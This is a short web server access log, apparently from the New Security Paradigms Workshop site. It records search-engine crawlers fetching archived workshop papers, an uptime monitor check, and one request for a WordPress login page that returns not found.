66.249.73.91 - - [01/May/2018:15:28:57 -0400] "GET /papers/2001/nspw2001-hosmer.pdf HTTP/1.1" 200 70429 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:15:29:14 -0400] "GET /2009/proceedings/2002/nspw2002-haldar.pdf HTTP/1.1" 200 512210 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
71.208.65.211 - - [01/May/2018:15:29:28 -0400] "GET /wp-login.php HTTP/1.1" 404 7686 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
71.208.65.211 - - [01/May/2018:15:29:28 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
40.77.167.208 - - [01/May/2018:15:29:58 -0400] "GET /papers/2011/nspw2011-feigenbaum.pdf HTTP/1.1" 200 602233 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.89 - - [01/May/2018:15:30:21 -0400] "GET /2009/proceedings/2013-pre/explicit-auth.pdf HTTP/1.1" 404 8101 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:15:30:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
157.55.39.242 - - [01/May/2018:15:30:39 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 200 667405 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.89 - - [01/May/2018:15:31:58 -0400] "GET /papers/1993/nspw1993-dobson.pdf HTTP/1.1" 200 1283187 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.89 - - [01/May/2018:15:31:59 -0400] "GET /papers/2011/nspw2011-bishop.pdf HTTP/1.1" 200 569321 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.89 - - [01/May/2018:15:32:20 -0400] "GET /papers/2008/nspw2008-shirley.pdf HTTP/1.1" 200 558791 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
